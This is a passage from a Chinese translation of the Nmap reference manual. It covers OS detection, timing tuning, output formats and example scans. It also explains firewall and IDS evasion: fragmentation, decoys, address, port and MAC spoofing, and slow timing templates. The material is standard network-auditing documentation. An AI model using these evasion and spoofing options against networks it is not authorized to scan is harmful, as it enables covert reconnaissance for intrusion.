一些波动。通常采用英国的分类较好，如“worthy challenge”或者 “trivial joke”。在详细模式(-v)下只以 普通的方式输出，如果同时使用-O，还报告IPID序列产生号。 很多主机的序列号是“增加”类别，即在每个发送包的IP头中 增加ID域值， 这对一些先进的信息收集和哄骗攻击来说是个漏洞。\nhttps://nmap.org/book/osdetect.html文档使用多种语言描述了版本检测的方式、使用和定制。\n采用下列选项启用和控制操作系统检测:\n-O (启用操作系统检测)\n也可以使用-A来同时启用操作系统检测和版本检测。\n–osscan-limit (针对指定的目标进行操作系统检测)\n如果发现一个打开和关闭的TCP端口时，操作系统检测会更有效。 采用这个选项，Nmap只对满足这个条件的主机进行操作系统检测，这样可以 节约时间，特别在使用-P0扫描多个主机时。这个选项仅在使用 -O或-A 进行操作系统检测时起作用。\n–osscan-guess; –fuzzy (推测操作系统检测结果)\n当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配，使用上述任一个选项使得Nmap的推测更加有效。\n时间和性能Nmap开发的最高优先级是性能。在本地网络对一个主机的默认扫描(nmap )需要1&#x2F;5秒。而仅仅眨眼的 时间，就需要扫描上万甚至几十万的主机。此外，一些特定的扫描选项会明显增 加扫描时间，如UDP扫描和版本检测。同样，防火墙配置以及特殊的响应速度限制也会 增加时间。Nmap使用了并行算法和许多先进的算法来加速扫描，用户对Nmap如何 工作有最终的控制权。高级用户可以仔细地调整Nmap命令，在满足时间要求的同时获得他们所关心的信息。\n改善扫描时间的技术有：忽略非关键的检测、升级最新版本的Nmap(性能增强不断改善)。 优化时间参数也会带来实质性的变化，这些参数如下。\n–min-hostgroup ; –max-hostgroup (调整并行扫描组的大小)\nNmap具有并行扫描多主机端口或版本的能力，Nmap将多个目标IP地址 空间分成组，然后在同一时间对一个组进行扫描。通常，大的组更有效。缺 点是只有当整个组扫描结束后才会提供主机的扫描结果。如果组的大小定义 为50，则只有当前50个主机扫描结束后才能得到报告(详细模式中的补充信息 除外)。\n默认方式下，Nmap采取折衷的方法。开始扫描时的组较小， 最小为5，这样便于尽快产生结果；随后增长组的大小，最大为1024。确切的 大小依赖于所给定的选项。为保证效率，针对UDP或少量端口的TCP扫描，Nmap 使用大的组。\n–max-hostgroup选项用于说明使用最大的组，Nmap不会超出这个大小。–min-hostgroup选项说明最小的组，Nmap 会保持组大于这个值。如果在指定的接口上没有足够的目标主机来满足所 指定的最小值，Nmap可能会采用比所指定的值小的组。这两个参数虽然很少使用， 但都用于保持组的大小在一个指定的范围之内。\n这些选项的主要用途是说明一个最小组的大小，使得整个扫描更加快速。通常 选择256来扫描C类网段。对于端口数较多的扫描，超出该值没有意义。对于 端口数较少的扫描，2048或更大的组大小是有帮助的。\n–min-parallelism ; –max-parallelism (调整探测报文的并行度)\n这些选项控制用于主机组的探测报文数量，可用于端口扫描和主机发现。默认状态下， Nmap基于网络性能计算一个理想的并行度，这个值经常改变。如果报文被丢弃， Nmap降低速度，探测报文数量减少。随着网络性能的改善，理想的探测报文数量会缓慢增加。 这些选项确定这个变量的大小范围。默认状态下，当网络不可靠时，理想的并行度值 可能为1，在好的条件下，可能会增长至几百。\n最常见的应用是–min-parallelism值大于1，以加快 性能不佳的主机或网络的扫描。这个选项具有风险，如果过高则影响准确度，同时 也会降低Nmap基于网络条件动态控制并行度的能力。这个值设为10较为合适， 这个值的调整往往作为最后的手段。\n–max-parallelism选项通常设为1，以防止Nmap在同一时间 向主机发送多个探测报文，和选择–scan-delay同时使用非常有用，虽然 这个选项本身的用途已经很好。\n–min-rtt-timeout ， –max-rtt-timeout ， –initial-rtt-timeout (调整探测报文超时)\nNmap使用一个运行超时值来确定等待探测报文响应的时间，随后会放弃或重新 发送探测报文。Nmap基于上一个探测报文的响应时间来计算超时值，如果网络延迟比较显著 和不定，这个超时值会增加几秒。初始值的比较保守(高)，而当Nmap扫描无响应 的主机时，这个保守值会保持一段时间。\n这些选项以毫秒为单位，采用小的–max-rtt-timeout值，使 –initial-rtt-timeout值大于默认值可以明显减少扫描时间，特别 是对不能ping通的扫描(-P0)以及具有严格过滤的网络。如果使用太 小的值，使得很多探测报文超时从而重新发送，而此时可能响应消息正在发送，这使得整个扫描的时 间会增加。\n如果所有的主机都在本地网络，对于–max-rtt-timeout值来 说，100毫秒比较合适。如果存在路由，首先使用ICMP ping工具ping主机，或使用其 它报文工具如hpings，可以更好地穿透防火墙。查看大约10个包的最大往返时间，然后将 –initial-rtt-timeout设成这个时间的2倍，–max-rtt-timeout 可设成这个时间值的3倍或4倍。通常，不管ping的时间是多少，最大的rtt值不得小于100ms， 不能超过1000ms。\n–min-rtt-timeout这个选项很少使用，当网络不可靠时， Nmap的默认值也显得过于强烈，这时这个选项可起作用。当网络看起来不可靠时，Nmap仅将 超时时间降至最小值，这个情况是不正常的，需要向nmap-dev邮件列表报告bug。\n–host-timeout (放弃低速目标主机)\n由于性能较差或不可靠的网络硬件或软件、带宽限制、严格的防火墙等原因， 一些主机需要很长的时间扫描。这些极少数的主机扫描往往占 据了大部分的扫描时间。因此，最好的办法是减少时间消耗并且忽略这些主机，使用 –host-timeout选项来说明等待的时间(毫秒)。通常使用1800000 来保证Nmap不会在单个主机上使用超过半小时的时间。需要注意的是，Nmap在这半小时中可以 同时扫描其它主机，因此并不是完全放弃扫描。超时的主机被忽略，因此也没有针对该主机的 端口表、操作系统检测或版本检测结果的输出。\n–scan-delay ; –max-scan-delay (调整探测报文的时间间隔)\n这个选项用于Nmap控制针对一个主机发送探测报文的等待时间(毫秒)，在带宽 控制的情况下这个选项非常有效。Solaris主机在响应UDP扫描探测报文报文时，每秒只发送一个ICMP消息，因此Nmap发送的很多数探测报文是浪费的。–scan-delay 设为1000，使Nmap低速运行。Nmap尝试检测带宽控制并相应地调整扫描的延迟，但 并不影响明确说明何种速度工作最佳。\n–scan-delay的另一个用途是躲闭基于阈值的入侵检测和预防 系统(IDS&#x2F;IPS)。\n-T &lt;Paranoid|Sneaky|Polite|Normal|Aggressive|Insane&gt; (设置时间模板)\n上述优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap提供了一些简单的 方法，使用6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)。前两种模式用于IDS躲避，Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。默认模式为Normal，因此-T3 实际上是未做任何优化。Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描。Insane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。\n用户可以根据自己的需要选择不同的模板，由Nmap负责选择实际的时间值。 模板也会针对其它的优化控制选项进行速度微调。例如，-T4 针对TCP端口禁止动态扫描延迟超过10ms，-T5对应的值为5ms。 模板可以和优化调整控制选项组合使用，但模板必须首先指定，否则模板的标准值 会覆盖用户指定的值。建议在扫描可靠的网络时使用 -T4，即使 在自己要增加优化控制选项时也使用(在命令行的开始)，从而从这些额外的较小的优化 中获益。\n如果用于有足够的带宽或以太网连接，仍然建议使用-T4选项。 有些用户喜欢-T5选项，但这个过于强烈。有时用户考虑到避免使主机 崩溃或者希望更礼貌一些会采用-T2选项。他们并没意识到-T Polite选项是如何的慢，这种模式的扫描比默认方式实际上要多花10倍的时间。默认时间 选项(-T3)很少有主机崩溃和带宽问题，比较适合于谨慎的用户。不进行 版本检测比进行时间调整能更有效地解决这些问题。\n虽然-T0和-T1选项可能有助于避免IDS告警，但 在进行上千个主机或端口扫描时，会显著增加时间。对于这种长时间的扫描，宁可设定确切的时间 值，而不要去依赖封装的-T0和-T1选项。\nT0选项的主要影响是对于连续扫描，在一个时间只能扫描一个端口， 每个探测报文的发送间隔为5分钟。T1和T2选项比较类似， 探测报文间隔分别为15秒和0.4秒。T3是Nmap的默认选项，包含了并行扫描。 T4选项与 –max-rtt-timeout 1250 –initial-rtt-timeout 500 等价，最大TCP扫描延迟为10ms。T5等价于 –max-rtt-timeout 300 –min-rtt-timeout 50 –initial-rtt-timeout 250 –host-timeout 900000，最大TCP扫描延迟为5ms。\n防火墙&#x2F;IDS躲避和欺骗很多Internet先驱们设想了一个全球开放的网络，使用全局的IP 地址空间，使得任何两个节点之间都有虚拟连接。这使得主机间可以作为真 正的对等体，相互间提供服务和获取信息。人们可以在工作时访问家里所 有的系统、调节空调温度、为提前到来的客人开门。随后，这些全球连接的设想 受到了地址空间短缺和安全考虑的限制。在90年代早期，各种机构开始部 署防火墙来实现减少连接的目的，大型网络通过代理、NAT和包过滤器与未 过滤的Internet隔离。不受限的信息流被严格控制的可信通信通道信息流所替代。\n类似防火墙的网络隔离使得对网络的搜索更加困难，随意的搜 索变得不再简单。然而，Nmap提供了很多特性用于理解这些复杂的网 络，并且检验这些过滤器是否正常工作。此外，Nmap提供了绕过某些较弱的 防范机制的手段。检验网络安全状态最有效的方法之一是尝试哄骗网络，将 自己想象成一个攻击者，使用本节提供的技术来攻击自己的网络。如使用FTP bounce扫描、Idle扫描、分片攻击或尝试穿透自己的代理。\n除限止网络的行为外，使用入侵检测系统(IDS)的公司也不断增加。由于Nmap 常用于攻击前期的扫描，因此所有主流的IDS都包含了检测Nmap扫描的规则。 现在，这些产品变形为入侵预防系统(IPS)，可以主 动地阻止可疑的恶意行为。不幸的是，网络管理员和IDS厂商通过分析报文 来检测恶意行为是一个艰苦的工作，有耐心和技术的攻击者，在特定Nmap选项 的帮助下，常常可以不被IDS检测到。同时，管理员必须应付大量的误报结果， 正常的行为被误判而被改变或阻止。\n有时，人们建议Nmap不应该提供躲闭防火墙规则或哄骗IDS的功能， 这些功能可能会被攻击者滥用，然而管理员却可以利用这些功能来增强安全性。 实际上，攻击的方法仍可被攻击者利用，他们可以发现其它工具或Nmap的补丁程 序。同时，管理员发现攻击者的工作更加困难，相比较采取措施来预防执 行FTP Bounce攻击的工具而言，部署先进的、打过补丁的FTP服务器更 加有效。\nNmap不提供检测和破坏防火墙及IDS系统的魔弹(或Nmap选项)，它使用 的是技术和经验，这超出了本参考手册的范围，下面描述了相关的选项和 完成的工作。\n-f (报文分段); –mtu (使用指定的MTU)\n-f选项要求扫描时(包挺ping扫描)使用 小的IP包分段。其思路是将TCP头分段在几个包中，使得包过滤器、 IDS以及其它工具的检测更加困难。必须小心使用这个选项，有些系 统在处理这些小包时存在问题，例如旧的网络嗅探器Sniffit在接收 到第一个分段时会立刻出现分段错误。该选项使用一次，Nmap在IP 头后将包分成8个字节或更小。因此，一个20字节的TCP头会被分成3个 包，其中2个包分别有TCP头的8个字节，另1个包有TCP头的剩下4个字 节。当然，每个包都有一个IP头。再次使用-f可使用 16字节的分段(减少分段数量)。使用–mtu选项可 以自定义偏移的大小，使用时不需要-f，偏移量必须 是8的倍数。包过滤器和防火墙对所有的IP分段排队，如Linux核心中的 CONFIG-IP-ALWAYS-DEFRAG配置项，分段包不会直接使用。一些网络无法 承受这样所带来的性能冲击，会将这个配置禁止。其它禁止的原因有分段 包会通过不同的路由进入网络。一些源系统在内核中对发送的报文进行 分段，使用iptables连接跟踪模块的Linux就是一个例子。当使用类似Ethereal 的嗅探器时，扫描必须保证发送的报文要分段。如果主机操作系统会产 生问题，尝试使用–send-eth选项以避开IP层而直接 发送原始的以太网帧。\n-D &lt;decoy1 [，decoy2][，ME]，…&gt; (使用诱饵隐蔽扫描)\n为使诱饵扫描起作用，需要使远程主机认为是诱饵在扫描目标网络。 IDS可能会报个某个IP的5-10个端口扫描，但并不知道哪个IP在扫描以及 哪些不是诱饵。但这种方式可以通过路由跟踪、响应丢弃以及其它主动 机制在解决。这是一种常用的隐藏自身IP地址的有效技术。\n使用逗号分隔每个诱饵主机，也可用自己的真实IP作为诱饵，这时可使用 ME选项说明。如果在第6个位置或 更后的位置使用ME选项，一些常用 端口扫描检测器(如Solar Designer’s excellent scanlogd)就不会报告 这个真实IP。如果不使用ME选项，Nmap 将真实IP放在一个随机的位置\n注意，作为诱饵的主机须在工作状态，否则会导致目标主机的SYN洪水攻击。 如果在网络中只有一个主机在工作，那就很容易确定哪个主机在扫描。也可 使用IP地址代替主机名(被诱骗的网络就不可能在名字服务器日志中发现)。\n诱饵可用在初始的ping扫描(ICMP、SYN、ACK等)阶段或真正的端口扫描 阶段。诱饵也可以用于远程操作系统检测(-O)。在进行版 本检测或TCP连接扫描时，诱饵无效。\n使用过多的诱饵没有任何价值，反而导致扫描变慢并且结果不准确。 此外，一些ISP会过滤哄骗的报文，但很多对欺骗IP包没有任何限制。\n-S  (源地址欺骗)\n在某些情况下，Nmap可能无法确定你的源地址(如果这样，Nmap会给出 提示)。此时，使用-S选项并说明所需发送包的接口IP地址。\n这个标志的另一个用处是哄骗性的扫描，使得目标认为是另 一个地址在进行扫描。可以想象某一个竞争对手在不断扫描某个公司！ -e选项常在这种情况下使用，也可采用-P0选项。\n-e (使用指定的接口)\n告诉Nmap使用哪个接口发送和接收报文，Nmap可以进行自动检测， 如果检测不出会给出提示。\n–source-port ; -g (源端口欺骗)\n仅依赖于源端口号就信任数据流是一种常见的错误配置，这个问题非常 好理解。例如一个管理员部署了一个新的防火墙，但招来了很多用户的不满，因为 他们的应用停止工作了。可能是由于外部的UDP DNS服务器响应无法进入网络，而导致 DNS的崩溃。FTP是另一个常见的例子，在FTP传输时，远程服务器尝试和内部用 建立连接以传输数据。\n对这些问题有安全解决方案，通常是应用级代理或协议分析防火墙模块。 但也存在一些不安全的方案。注意到DNS响应来自于53端口，FTP连接 来自于20端口，很多管理员会掉入一个陷阱，即允许来自于这些端口的数据进入 网络。他们认为这些端口里不会有值得注意的攻击和漏洞利用。此外，管理员 或许认为这是一个短期的措施，直至他们采取更安全的方案。但他们忽视了安全的 升级。\n不仅仅是工作量过多的网络管理员掉入这种陷阱，很多产品本身也会有这类 不安全的隐患，甚至是微软的产品。Windows 2000和Windows XP中包含的IPsec过滤 器也包含了一些隐含规则，允许所有来自88端口(Kerberos)的TCP和UDP数据流。另 一个常见的例子是Zone Alarm个人防火墙到2.1.25版本仍然允许源端口53(DNS)或 67(DHCP)的UDP包进入。\nNmap提供了-g和–source-port选项(它们是 等价的)，用于利用上述弱点。只需要提供一个端口号，Nmap就可以从这些 端口发送数据。为使特定的操作系统正常工作，Nmap必须使用不同的端口号。 DNS请求会忽略–source-port选项，这是因为Nmap依靠系 统库来处理。大部分TCP扫描，包括SYN扫描，可以完全支持这些选项，UDP扫 描同样如此。\n–data-length (发送报文时附加随机数据)\n正常情况下，Nmap发送最少的报文，只含一个包头。因此TCP包通常 是40字节，ICMP ECHO请求只有28字节。这个选项告诉Nmap在发送的报文上 附加指定数量的随机字节。操作系统检测(-O)包不受影响， 但大部分ping和端口扫描包受影响，这会使处理变慢，但对扫描的影响较小。\n–ttl (设置IP time-to-live域)\n设置IPv4报文的time-to-live域为指定的值。\n–randomize-hosts (对目标主机的顺序随机排列)\n告诉Nmap在扫描主机前对每个组中的主机随机排列，最多可达 8096个主机。这会使得扫描针对不同的网络监控系统来说变得不是很 明显，特别是配合值较小的时间选项时更有效。如果需要对一个较大 的组进行随机排列，需要增大nmap.h文件中 PING-GROUP-SZ的值，并重新编译。另一种方法是使用列表扫描 (-sL -n -oN )，产生目标IP的列表， 使用Perl脚本进行随机化，然后使用-iL提供给Nmap。\n–spoof-mac &lt;mac address，prefix，or vendor name&gt; (MAC地址欺骗)\n要求Nmap在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 –send-eth选项，以保证Nmap真正发送以太网包。MAC地址有几 种格式。如果简单地使用字符串“0”，Nmap选择一个完全随机的MAC 地址。如果给定的字符品是一个16进制偶数(使用:分隔)，Nmap将使用这个MAC地址。 如果是小于12的16进制数字，Nmap会随机填充剩下的6个字节。如果参数不是0或16进 制字符串，Nmap将通过nmap-mac-prefixes查找 厂商的名称(大小写区分)，如果找到匹配，Nmap将使用厂商的OUI(3字节前缀)，然后 随机填充剩余的3个节字。正确的–spoof-mac参数有， Apple， 0，01:02:03:04:05:06， deadbeefcafe，0020F2和Cisco。\n输出任何安全工具只有在输出结果时才是有价值的，如果没有通过组织和易于理解的方式来表达，复杂的测试和算法几乎没有意义。Nmap提供了一些方式供用户和其它软件使用，实际上，没有一种方式可以使所有人满意。 因此Nmap提供了一些格式，包含了方便直接查看的交互方式和方便软件处理的XML格式。\n除了提供输出格式外，Nmap还提供了选项来控制输出的细节以及调试 信息。输出内容可发送给标准输出或命名文件，可以追加或覆盖。输出文件还可 被用于继续中断的扫描。\nNmap提供5种不同的输出格式。默认的方式是interactive output， 发送给标准输出(stdout)。normal output方式类似于 interactive，但显示较少的运行时间信息 和告警信息，这是由于这些信息是在扫描完全结束后用于分析，而不是交互式的。\nXML输出是最重要的输出类型，可被转换成HTML，对于程序处理非常方便， 如用于Nmap图形用户接口或导入数据库。\n另两种输出类型比较简单，grepable output格式，在一行中包含目标主机最多的信息；sCRiPt KiDDi3 0utPUt 格式，用于考虑自己的用户 |&lt;-r4d。\n交互式输出是默认方式，没有相应的命令行选项，其它四种格式选项 使用相同的语法，采用一个参数，即存放结果的文件名。多种格式可同时 使用，但一种格式只能使用一次。例如，在标准输出用于查看的同时，可将结 果保存到XML文件用于程序分析，这时可以使用选项-oX myscan.xml -oN myscan.nmap。 为便于描述的简化，本章使用类似于myscan.xml的简单文件名， 建议采用更具有描述性的文件名。文件名的选择与个人喜好有关，建议增加 扫描日期以及一到两个单词来描述，并放置于一个目录中。\n在将结果输出到文件的同时，Nmap仍将结果发送给标准输出。例如， 命令nmap -oX myscan.xml target将 输出XML至myscan.xml，并在stdout 上打印相同的交互式结果，而此时-oX选项没有采用。可以 使用连字符作为选项来改变，这使得Nmap禁止交互式输出，而是将结果打印到 所指定的标准输出流中。因此，命令nmap -oX - target只 输出XML至标准输出stdout。严重错误仍然是输出到标准错误流stderr中。\n与其它Nmap参数不同，日志文件选项的空格(如-oX)和 文件名或连字符是必需的。如果省略了标记，例如-oG-或 -oXscan.xml，Nmap的向后兼容特点将建立 标准格式的输出文件，相应的文件名为G-和 Xscan.xml。\nNmap还提供了控制扫描细节以及输出文件的添加或覆盖的选项，这些选项如下所述。\nNmap输出格式：\n-oN (标准输出)\n要求将标准输出直接写入指定 的文件。如上所述，这个格式与交互式输出 略有不同。\n-oX (XML输出)\n要求XML输出直接写入指定 的文件。Nmap包含了一个文档类型定义(DTD)，使XML解析器有效地 进行XML输出。这主要是为了程序应用，同时也可以协助人工解释 Nmap的XML输出。DTD定义了合法的格式元素，列举可使用的属性和 值。最新的版本可在http://www.insecure.org/nmap/data/nmap.dtd获取。\nXML提供了可供软件解析的稳定格式输出，主要的计算机 语言都提供了免费的XML解析器，如C&#x2F;C++，Perl，Python和Java。 针对这些语言有一些捆绑代码用于处理Nmap的输出和特定的执行程序。 例如perl CPAN中的Nmap::Scanner和Nmap::Parser。 对几乎所有与Nmap有接口的主要应用来说，XML是首选的格式。\nXML输出引用了一个XSL样式表，用于格式化输出结果，类似于 HTML。最方便的方法是将XML输出加载到一个Web浏览器，如Firefox 或IE。由于nmap.xsl文件的绝对 路径，因此通常只能在运行了Nmap的机器上工作(或类似配置的机器)。 类似于任何支持Web机器的HTML文件，–stylesheet 选项可用于建立可移植的XML文件。\n-oS (ScRipT KIdd|3 oUTpuT)\n脚本小子输出类似于交互工具输出，这是一个事后处理，适合于 ‘l33t HaXXorZ， 由于原来全都是大写的Nmap输出。这个选项和脚本小子开了玩笑，看上去似乎是为了 “帮助他们”。\n-oG (Grep输出)\n这种方式最后介绍，因为不建议使用。XML输格式很强大，便于有经验 的用户使用。XML是一种标准，由许多解析器构成，而Grep输届更简化。XML 是可扩展的，以支持新发布的Nmap特点。使用Grep输出的目的是忽略这些 特点，因为没有足够的空间。\n然面，Grep输出仍然很常使用。它是一种简单格式，每行一个主机，可以 通过UNIX工具(如grep、awk、cut、sed、diff)和Perl方便地查找和分解。常可 用于在命令行上进行一次性测式。查找ssh端口打开或运行Sloaris的主机，只需 要一个简单的grep主机说明，使用通道并通过awk或cut命令打印所需的域。\nGrep输出可以包含注释(每行由#号开始)。每行由6个标记的域组成，由制表符及 冒号分隔。这些域有主机，端口， 协议，忽略状态， 操作系统，序列号， IPID和状态。\n这些域中最重要的是Ports，它提供 了所关注的端口的细节，端口项由逗号分隔。每个端口项代表一个所关注的端口， 每个子域由&#x2F;分隔。这些子域有：端口号， 状态，协议， 拥有者，服务， SunRPCinfo和版本信息。\n对于XML输出，本手册无法列举所有的格式，有关Nmap Grep输出的更详细信息可查阅http://www.unspecific.com/nmap-oG-output。\n-oA (输出至所有格式)\n为使用方便，利用-oA选项 可将扫描结果以标准格式、XML格式和Grep格式一次性输出。分别存放在 .nmap，.xml和 .gnmap文件中。也可以在文件名前 指定目录名，如在UNIX中，使用~&#x2F;nmaplogs&#x2F;foocorp&#x2F;， 在Window中，使用c:\\hacking\\sco on Windows。\n细节和调试选项\n-v (提高输出信息的详细度)\n通过提高详细度，Nmap可以输出扫描过程的更多信息。 输出发现的打开端口，若Nmap认为扫描需要更多时间会显示估计 的结束时间。这个选项使用两次，会提供更详细的信息。这个选 项使用两次以上不起作用。\n大部分的变化仅影响交互式输出，也有一些影响标准和脚本 小子输出。其它输出类型由机器处理，此时Nmap默认提供详细的信 息，不需要人工干预。然而，其它模式也会有一些变化，省略一些 细节可以减小输出大小。例如，Grep输出中的注释行提供所有扫描 端口列表，但由于这些信息过长，因此只能在细节模式中输出。\n-d [level] (提高或设置调试级别)\n当详细模式也不能为用户提供足够的数据时，使用调试可以得到更 多的信息。使用细节选项(-v)时，可启用命令行参数 (-d)，多次使用可提高调试级别。也可在-d 后面使用参数设置调试级别。例如，-d9设定级别9。这是 最高的级别，将会产生上千行的输出，除非只对很少的端口和目标进行简单扫描。\n如果Nmap因为Bug而挂起或者对Nmap的工作及原理有疑问，调试输出 非常有效。主要是开发人员用这个选项，调试行不具备自我解释的特点。 例如，Timeoutvals: srtt: -1 rttvar: -1 to: 1000000 delta 14987 &#x3D;&#x3D;&gt; srtt: 14987 rttvar: 14987 to: 100000。如果对某行输出不明白， 可以忽略、查看源代码或向开发列表(nmap-dev)求助。有些输出行会有自 我解释的特点，但随着调试级别的升高，会越来越含糊。\n–packet-trace (跟踪发送和接收的报文)\n要求Nmap打印发送和接收的每个报文的摘要，通常用于 调试，有助于新用户更好地理解Nmap的真正工作。为避免输出过 多的行，可以限制扫描的端口数，如-p20-30。 如果只需进行版本检测，使用–version-trace。\n–iflist (列举接口和路由)\n输出Nmap检测到的接口列表和系统路由，用于调试路由 问题或设备描述失误(如Nmap把PPP连接当作以太网对待)。\n其它输出选项：\n–append-output (在输出文件中添加)\n当使用文件作为输出格式，如-oX或-oN， 默认该文件被覆盖。如果希望文件保留现有内容，将结果添加在现 有文件后面，使用–append-output选项。所有指 定的输出文件都被添加。但对于XML(-oX)扫描输出 文件无效，无法正常解析，需要手工修改。\n–resume (继续中断的扫描)\n一些扩展的Nmap运行需要很长的时间 – 以天计算，这类扫描 往往不会结束。可以进行一些限制，禁止Nmap在工作时间运行，导致 网络中断、运行Nmap的主机计划或非计划地重启、或者Nmap自己中断。 运行Nmap的管理员可以因其它原因取消运行，按下ctrl-C 即可。从头开始启动扫描可能令人不快，幸运的是，如果标准扫描 (-oN)或Grep扫描(-oG)日志 被保留，用户可以要求Nmap恢复终止的扫描，只需要简单地使用选项 –resume并说明标准&#x2F;Grep扫描输出文件，不允许 使用其它参数，Nmap会解析输出文件并使用原来的格式输出。使用方式 如nmap –resume 。 Nmap将把新地结果添加到文件中，这种方式不支持XML输出格式，原因是 将两次运行结果合并至一个XML文件比较困难。\n–stylesheet (设置XSL样式表，转换XML输出)\nNmap提从了XSL样式表nmap.xsl，用于查看 或转换XML输出至HTML。XML输出包含了一个xml-stylesheet， 直接指向nmap.xml文件， 该文件由Nmap安装(或位于Windows当前工作目录)。在Web浏览器 中打开Nmap的XML输出时，将会在文件系统中寻找nmap.xsl文件， 并使用它输出结果。如果希望使用不同的样式表，将它作为 –stylesheet的参数，必段指明完整的路 径或URL，常见的调用方式是–stylesheet http://www.insecure.org/nmap/data/nmap.xsl。 这告诉浏览器从Insecire.Org中加载最新的样式表。这使得 没安装Nmap(和nmap.xsl) 的机器中可以方便地查看结果。因此，URL更方便使用，本地文件系统 的nmap.xsl用于默认方式。\n–no-stylesheet (忽略XML声明的XSL样式表)\n使用该选项禁止Nmap的XML输出关联任何XSL样式表。 xml-stylesheet指示被忽略。\n其它选项本节描述一些重要的(和并不重要)的选项，这些选项 不适合其它任何地方。\n-6 (启用IPv6扫描)\n从2002年起，Nmap提供对IPv6的一些主要特征的支持。ping扫描(TCP-only)、 连接扫描以及版本检测都支持IPv6。除增加-6选项外， 其它命令语法相同。当然，必须使用IPv6地址来替换主机名，如 3ffe:7501:4819:2000:210:f3ff:fe03:14d0。 除“所关注的端口”行的地址部分为IPv6地址。\nIPv6目前未在全球广泛采用，目前在一些国家(亚洲)应用较多， 一些高级操作系统支持IPv6。使用Nmap的IPv6功能，扫描的源和目 的都需要配置IPv6。如果ISP(大部分)不分配IPv6地址，Nmap可以采用 免费的隧道代理。一种较好的选择是BT Exact，位于https://tb.ipv6.btexact.com/。 此外，还有Hurricane Electric，位于http://ipv6tb.he.net/。6to4隧道是 另一种常用的免费方法。\n-A (激烈扫描模式选项)\n这个选项启用额外的高级和高强度选项，目前还未确定代表 的内容。目前，这个选项启用了操作系统检测(-O) 和版本扫描(-sV)，以后会增加更多的功能。 目的是启用一个全面的扫描选项集合，不需要用户记忆大量的 选项。这个选项仅仅启用功能，不包含用于可能所需要的 时间选项(如-T4)或细节选项(-v)。\n–datadir (说明用户Nmap数据文件位置)\nNmap在运行时从文件中获得特殊的数据，这些文件有 nmap-service-probes， nmap-services， nmap-protocols， nmap-rpc， nmap-mac-prefixes和 nmap-os-fingerprints。Nmap首先 在–datadir选项说明的目录中查找这些文件。 未找到的文件，将在BMAPDIR环境变量说明的目录中查找。 接下来是用于真正和有效UID的~&#x2F;.nmap 或Nmap可执行代码的位置(仅Win32)；然后是是编译位置， 如&#x2F;usr&#x2F;local&#x2F;share&#x2F;nmap 或&#x2F;usr&#x2F;share&#x2F;nmap。 Nmap查找的最后一个位置是当前目录。\n–send-eth (使用原以太网帧发送)\n要求Nmap在以太网(数据链路)层而不是IP(网络层)发送 报文。默认方式下，Nmap选择最适合其运行平台的方式，原套接 字(IP层)是UNIX主机最有效的方式，而以太网帧最适合Windows操作 系统，因为Microsoft禁用了原套接字支持。在UNIX中，如果没有其 它选择(如无以太网连接)，不管是否有该选项，Nmap都使用原IP包。\n–send-ip (在原IP层发送)\n要求Nmap通过原IP套接字发送报文，而不是低层的以 太网帧。这是–send-eth选项的补充。\n–privileged (假定用户具有全部权限)\n告诉Nmap假定其具有足够的权限进行源套接字包发送、 报文捕获和类似UNIX系统中根用户操作的权限。默认状态下， 如果由getuid()请求的类似操作不为0，Nmap将退出。 –privileged在具有Linux内核性能的类似 系统中使用非常有效，这些系统配置允许非特权用户可以进行 原报文扫描。需要明确的是，在其它选项之前使用这些需要权 限的选项(SYN扫描、操作系统检测等)。Nmap-PRIVILEGED变量 设置等价于–privileged选项。\n-V; –version (打印版本信息)\n打印Nmap版本号并退出。\n-h; –help (打印帮助摘要面)\n打印一个短的帮助屏幕，列出大部分常用的 命令选项，这个功能与不带参数运行Nmap是相同的。\n运行时交互Nmap目前还不具有这个功能，本节内容可能会增加或删除。\n在执行Nmap时，所有的键盘敲击都被记录。这使得用户可以与 程序交互而不需要终止或重启。特定的键可改变选项，其它键会输出 一个有关扫描的状态消息。约定如下，小写字母增加 打印量，大写字母减少打印量。\nv &#x2F; V 增加&#x2F;减少细节\nd &#x2F; D 提高&#x2F;降低调试级别\np &#x2F; P 打开&#x2F;关闭报文跟踪\n其它 打印的信息类似于：\nStats: 0:00:08 elapsed; 111 hosts completed (5 up)， 5 undergoing Service Scan\nService scan Timing: About 28.00% done; ETC: 16:18 (0:00:15 remaining)\n实例下面给出一些实例，简单的、复杂的到深奥的。为更具体，一 些例子使用了实际的IP地址和域名。在这些位置，可以使用你自己网络 的地址&#x2F;域名替换。注意，扫描其它网络不一定合法，一些网络管理员不愿看到 未申请过的扫描，会产生报怨。因此，先获得允许是最好的办法。\n如果是为了测试，scanme.nmap.org 允许被扫描。但仅允许使用Nmap扫描并禁止测试漏洞或进行DoS攻击。为 保证带宽，对该主机的扫描每天不要超过12次。如果这个免费扫描服务被 滥用，系统将崩溃而且Nmap将报告解析 指定的主机名&#x2F;IP地址失败：scanme.nmap.org。这些免 费扫描要求也适用于scanme2.nmap.org、 scanme3.nmap.org等等，虽然这些 主机目前还不存在。\nnmap -v scanme.nmap.org\n这个选项扫描主机scanme.nmap.org中 所有的保留TCP端口。选项-v启用细节模式。\nnmap -sS -O scanme.nmap.org&#x2F;24\n进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段 的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 和操作系统检测，这个扫描需要有根权限。\nnmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127\n进行主机列举和TCP扫描，对象为B类188.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。\nnmap -v -iR 100000 -P0 -p 80\n随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段 发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因 此使用-P0禁止对主机列表。\nnmap -P0 -p80 -oX logs&#x2F;pb-port80scan.xml -oG logs&#x2F;pb-port80scan.gnmap 216.163.128.20&#x2F;20\n扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。\nhost -l 